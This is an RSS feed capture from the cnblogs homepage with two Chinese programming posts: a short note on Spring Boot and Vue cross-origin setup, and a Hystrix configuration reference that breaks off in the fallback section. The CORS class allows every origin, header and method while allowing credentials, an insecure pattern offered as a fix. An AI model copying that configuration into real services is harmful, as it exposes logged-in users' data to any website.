<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>【笔记】总结Springboot和Vue前后端分离的跨域问题 - Keane1998</title>
<link>http://www.cnblogs.com/zxcoder/p/11961069.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zxcoder/p/11961069.html</guid>
<description>&lt;p&gt;跨域一直是个很玄学的问题，SSM的时候又得前后端一起配置，sb的时候又不用。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;前端&lt;br/&gt;axios普通get请求&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;vue&quot;&gt;
&lt;code&gt;submitForm() {
    var v=this;
    this.$axios({
        method: 'get',
        url: api.base_url+'/user/login',
    }).then(function(res){
        var json = res.data;
        console.log(json);
        v.$store.commit('ADD_COUNT', json.data.token);
        v.$message('登录成功');
    }).catch(function(err){
        v.$message('密码或用户名错误');
    })
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;后端&lt;br/&gt;加一个配置类&lt;/li&gt;
&lt;/ul&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;package com.zxc.ticketsys.config;

import org.springframework.context.annotation.Configuration;
import org.springframework.scheduling.concurrent.ConcurrentTaskExecutor;
import org.springframework.web.servlet.config.annotation.AsyncSupportConfigurer;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport;

import java.util.concurrent.Executors;

/**
 * 跨域请求支持
 */
@Configuration
public class WebConfiguration extends WebMvcConfigurationSupport {

    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping(&quot;/**&quot;)
                .allowCredentials(true)
                .allowedHeaders(&quot;*&quot;)
                .allowedMethods(&quot;*&quot;)
                .allowedOrigins(&quot;*&quot;);
    }

    @Override
    protected void configureAsyncSupport(AsyncSupportConfigurer configurer){
        configurer.setTaskExecutor(new ConcurrentTaskExecutor(Executors.newFixedThreadPool(3)));
        configurer.setDefaultTimeout(30000);
    }
}&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Fri, 29 Nov 2019 16:15:00 +0000</pubDate>
<dc:creator>Keane1998</dc:creator>
<og:description>跨域一直是个很玄学的问题，SSM的时候又得前后端一起配置，sb的时候又不用。 前端 axios普通get请求 后端 加一个配置类</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zxcoder/p/11961069.html</dc:identifier>
</item>
<item>
<title>Hystrix完整配置列表 - throwable</title>
<link>http://www.cnblogs.com/throwable/p/11961016.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/throwable/p/11961016.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1412331/201911/1412331-20191129235817443-1215853889.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;前提&quot;&gt;前提&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Hystrix&lt;/code&gt;在2018年11月20日之后已经停止维护，最后一个提交记录是：&lt;code&gt;Latest commit 3cb2158 on 20 Nov 2018&lt;/code&gt;，最后一个正式版本为&lt;code&gt;1.5.18&lt;/code&gt;。鉴于目前所在公司的技术栈是&lt;code&gt;Spring Cloud&lt;/code&gt;，熔断和降级组件主要用的还是&lt;code&gt;Hystrix&lt;/code&gt;，这里就&lt;code&gt;Hystrix&lt;/code&gt;的完整列表做一个分析记录，方便以后可以随时查询。本文主要参考：&lt;a href=&quot;https://github.com/Netflix/Hystrix/wiki/Configuration&quot;&gt;Hystrix Configuration&lt;/a&gt;。其中，命令配置是针对&lt;code&gt;HystrixCommand&lt;/code&gt;，主要包括命令执行(execution)配置、命令降级(fallback)配置、熔断器(circuit breaker)配置、度量统计(metrics)配置和请求上下文配置。&lt;/p&gt;
&lt;h2 id=&quot;hystrixcommandkeyhystrixcommandgroupkey和hystrixthreadpoolkey&quot;&gt;HystrixCommandKey、HystrixCommandGroupKey和HystrixThreadPoolKey&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;HystrixCommandKey&lt;/code&gt;、&lt;code&gt;HystrixCommandGroupKey&lt;/code&gt;和&lt;code&gt;HystrixThreadPoolKey&lt;/code&gt;三个KEY是&lt;code&gt;HystrixCommand&lt;/code&gt;的重要标识。下面分别分析一下它们的含义。&lt;/p&gt;
&lt;h3 id=&quot;hystrixcommandkey&quot;&gt;HystrixCommandKey&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;HystrixCommandKey&lt;/code&gt;是&lt;code&gt;Hystrix&lt;/code&gt;命令的唯一标识，准确来说是&lt;code&gt;HystrixCommand&lt;/code&gt;实例或者&lt;code&gt;HystrixObservableCommand&lt;/code&gt;实例的唯一标识。它是必须的，如果不自定义配置，它会通过下面方式确定默认值：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;[HystrixCommand或者HystrixObservableCommand的具体子类].getClass().getSimpleName();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;编程式配置如下：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;HystrixCommandKey.Factory.asKey(&quot;Your Key&quot;);


public Command() {
    super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;Group Key&quot;))
                .andCommandKey(HystrixCommandKey.Factory.asKey(&quot;Command Key&quot;)));
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;注意一点：大部分&lt;code&gt;Hystrix&lt;/code&gt;的配置都是和&lt;code&gt;HystrixCommandKey&lt;/code&gt;绑定，所以&lt;code&gt;HystrixCommandKey&lt;/code&gt;是比较重要的。&lt;/p&gt;
&lt;h3 id=&quot;hystrixcommandgroupkey&quot;&gt;HystrixCommandGroupKey&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;HystrixCommandGroupKey&lt;/code&gt;是用于对&lt;code&gt;Hystrix&lt;/code&gt;命令进行分组，分组之后便于统计展示于仪表盘、上传报告和预警等等，也就是说，&lt;code&gt;HystrixCommandGroupKey&lt;/code&gt;是&lt;code&gt;Hystrix&lt;/code&gt;内部进行度量统计时候的分组标识，数据上报和统计的最小维度就是分组的KEY。&lt;code&gt;HystrixCommandGroupKey&lt;/code&gt;是必须配置的，配置方式如下：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;HystrixCommandGroupKey.Factory.asKey(&quot;Group Key&quot;)

public Command() {
    super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;Group Key&quot;)));
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;hystrixthreadpoolkey&quot;&gt;HystrixThreadPoolKey&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;HystrixThreadPoolKey&lt;/code&gt;主要标识用于监控、度量和缓存等等作用的&lt;code&gt;HystrixThreadPool&lt;/code&gt;实例。一个&lt;code&gt;HystrixCommand&lt;/code&gt;会和一个独立的&lt;code&gt;HystrixThreadPool&lt;/code&gt;实例关联，也就是说一类&lt;code&gt;HystrixCommand&lt;/code&gt;总是在同一个&lt;code&gt;HystrixThreadPool&lt;/code&gt;实例中执行。如果不显式配置&lt;code&gt;HystrixThreadPoolKey&lt;/code&gt;，那么会使用&lt;code&gt;HystrixCommandGroupKey&lt;/code&gt;的值去配置&lt;code&gt;HystrixThreadPoolKey&lt;/code&gt;。&lt;code&gt;HystrixThreadPoolKey&lt;/code&gt;的配置方式如下：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;HystrixThreadPoolKey.Factory.asKey(&quot;ThreadPoolKey&quot;)

public Command() {
    super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;xxx&quot;))
                .andCommandKey(HystrixCommandKey.Factory.asKey(&quot;YYY&quot;))
                .andThreadPoolKey(HystrixThreadPoolKey.Factory.asKey(&quot;ThreadPoolKey&quot;)));
}&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;命令执行execution配置&quot;&gt;命令执行(execution)配置&lt;/h2&gt;
&lt;h3 id=&quot;隔离策略&quot;&gt;隔离策略&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;execution.isolation.strategy&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;隔离策略决定&lt;code&gt;Hystrix&lt;/code&gt;命令执行的时候采用什么类型的策略进行依赖隔离。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;THREAD&lt;/code&gt; (见&lt;code&gt;ExecutionIsolationStrategy.THREAD&lt;/code&gt;)&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;THREAD&lt;/code&gt;,&lt;code&gt;SEMAPHORE&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.execution.isolation.strategy&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].execution.isolation.strategy&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;执行隔离策略到底选择线程池(&lt;code&gt;THREAD&lt;/code&gt;)还是信号量(&lt;code&gt;SEMAPHORE&lt;/code&gt;)？文档中给出的建议是：&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;使用&lt;code&gt;HystrixCommand&lt;/code&gt;的时候建议用&lt;code&gt;THREAD&lt;/code&gt;策略，使用&lt;code&gt;HystrixObservableCommand&lt;/code&gt;的时候建议使用&lt;code&gt;SEMAPHORE&lt;/code&gt;策略。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;使用&lt;code&gt;THREAD&lt;/code&gt;策略让&lt;code&gt;HystrixCommand&lt;/code&gt;在线程中执行可以提供额外的保护层，以防止因为网络超时导致的延时失败。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;一般情况下，只有这种特殊例子下&lt;code&gt;HystrixCommand&lt;/code&gt;会搭配&lt;code&gt;SEMAPHORE&lt;/code&gt;策略使用：调用的频次太高(例如每个实例每秒数百次调用)，这种情况如果选用&lt;code&gt;THREAD&lt;/code&gt;策略有可能导致超过线程隔离的上限(有可能需要太多的线程或者命令太多线程不足够用于隔离请求)，这种情况一般是非网络请求调用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;笔者想说的是：建议选用默认值，因为目前很少遇到使用信号量隔离的场景。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withExecutionIsolationStrategy(HystrixCommandProperties.ExecutionIsolationStrategy.THREAD)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.execution.isolation.strategy=THREAD

# 实例配置
hystrix.command.CustomCommand.execution.isolation.strategy=THREAD&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;是否允许超时&quot;&gt;是否允许超时&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;execution.timeout.enabled&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;决定&lt;code&gt;HystrixCommand#run()&lt;/code&gt;执行时是否允许超时，只有设置为true的时候，下面提到的“超时时间上限”才会有效。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;,&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.execution.timeout.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].execution.timeout.enabled&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;保持选用默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withExecutionTimeoutEnabled(true)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.execution.timeout.enabled=true

# 实例配置
hystrix.command.CustomCommand.execution.timeout.enabled=true&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;超时时间上限&quot;&gt;超时时间上限&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;execution.isolation.thread.timeoutInMilliseconds&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;code&gt;HystrixCommand&lt;/code&gt;执行时候超时的最大上限，单位是毫秒，如果命令执行耗时超过此时间值那么会进入降级逻辑。这个配置生效的前提是&lt;code&gt;hystrix.command.default.execution.timeout.enabled&lt;/code&gt;或者&lt;code&gt;hystrix.command.[HystrixCommandKey].execution.timeout.enabled&lt;/code&gt;为true。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;1000&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].execution.isolation.thread.timeoutInMilliseconds&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;保持选用默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withExecutionTimeoutInMilliseconds(1000)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds=1000

# 实例配置
hystrix.command.CustomCommand.execution.isolation.thread.timeoutInMilliseconds=1000&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;超时是否中断&quot;&gt;超时是否中断&lt;/h3&gt;
&lt;p&gt;此配置项决定&lt;code&gt;HystrixCommand#run()&lt;/code&gt;执行的时候调用超时的情况下是否中断。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;、&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.execution.isolation.thread.interruptOnTimeout&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].execution.isolation.thread.interruptOnTimeout&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;保持选用默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withExecutionIsolationThreadInterruptOnTimeout(true)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.execution.isolation.thread.interruptOnTimeout=true

# 实例配置
hystrix.command.CustomCommand.execution.isolation.thread.interruptOnTimeout=true&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;取消是否中断&quot;&gt;取消是否中断&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;execution.isolation.thread.interruptOnCancel&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此配置项决定&lt;code&gt;HystrixCommand#run()&lt;/code&gt;执行的时候取消调用的情况下是否中断。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;、&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.execution.isolation.thread.interruptOnCancel&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].execution.isolation.thread.interruptOnCancel&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;保持选用默认值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withExecutionIsolationThreadInterruptOnFutureCancel(false)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.execution.isolation.thread.interruptOnCancel=false

# 实例配置
hystrix.command.CustomCommand.execution.isolation.thread.interruptOnCancel=false&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;最大并发请求上限semaphore&quot;&gt;最大并发请求上限(SEMAPHORE)&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;execution.isolation.semaphore.maxConcurrentRequests&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此配置项决定使用&lt;code&gt;HystrixCommand#run()&lt;/code&gt;方法和&lt;code&gt;ExecutionIsolationStrategy.SEMAPHORE&lt;/code&gt;隔离策略下并发请求数量的最高上限。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.execution.isolation.semaphore.maxConcurrentRequests&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].execution.isolation.semaphore.maxConcurrentRequests&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;必须根据实际情况设定此值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withExecutionIsolationStrategy(HystrixCommandProperties.ExecutionIsolationStrategy.SEMAPHORE)
                        .withExecutionIsolationSemaphoreMaxConcurrentRequests(100)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.execution.isolation.semaphore.maxConcurrentRequests=100

# 实例配置
hystrix.command.CustomCommand.execution.isolation.semaphore.maxConcurrentRequests=100&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;命令降级fallback配置&quot;&gt;命令降级(fallback)配置&lt;/h2&gt;
&lt;p&gt;命令降级配置控制&lt;code&gt;HystrixCommand#getFallback()&lt;/code&gt;的执行逻辑，所有命令降级配置对策略&lt;code&gt;ExecutionIsolationStrategy.THREAD&lt;/code&gt;或者&lt;code&gt;ExecutionIsolationStrategy.SEMAPHORE&lt;/code&gt;都生效。&lt;/p&gt;
&lt;h3 id=&quot;最大并发降级请求处理上限&quot;&gt;最大并发降级请求处理上限&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;fallback.isolation.semaphore.maxConcurrentRequests&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这个属性用于控制一个&lt;code&gt;HystrixCommand#getFallback()&lt;/code&gt;实例方法在执行线程中调用的最大上限，如果超过此上限，降级逻辑不会执行并且会抛出一个异常。&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;默认值&lt;/td&gt;
&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;可选值&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;默认全局配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.default.fallback.isolation.semaphore.maxConcurrentRequests&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;实例配置&lt;/td&gt;
&lt;td&gt;&lt;code&gt;hystrix.command.[HystrixCommandKey].fallback.isolation.semaphore.maxConcurrentRequests&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;建议(笔者备注)&lt;/td&gt;
&lt;td&gt;必须根据实际情况设定此值&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;编程式配置：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class CustomCommand extends HystrixCommand&amp;lt;String&amp;gt; {

    public CustomCommand() {
        super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(&quot;CustomCommand&quot;))
                .andCommandPropertiesDefaults(HystrixCommandProperties.Setter()
                        .withFallbackIsolationSemaphoreMaxConcurrentRequests(20)));
    }

    @Override
    protected String run() throws Exception {
        return null;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;配置文件中(Properties)配置：&lt;/p&gt;
&lt;pre class=&quot;properties&quot;&gt;
&lt;code&gt;# 下面配置二选一

# 默认全局配置
hystrix.command.default.fallback.isolation.semaphore.maxConcurrentRequests=20

# 实例配置
hystrix.command.CustomCommand.fallback.isolation.semaphore.maxConcurrentRequests=20&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;是否开启降级&quot;&gt;是否开启降级&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;fallback.enabled&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此属性控制当&lt;code&gt;HystrixCommand&lt;/code&gt;执行失败之后是否调用&lt;code&gt;HystrixCommand#getFallback()&lt;/code&gt;。&lt;/p&gt;
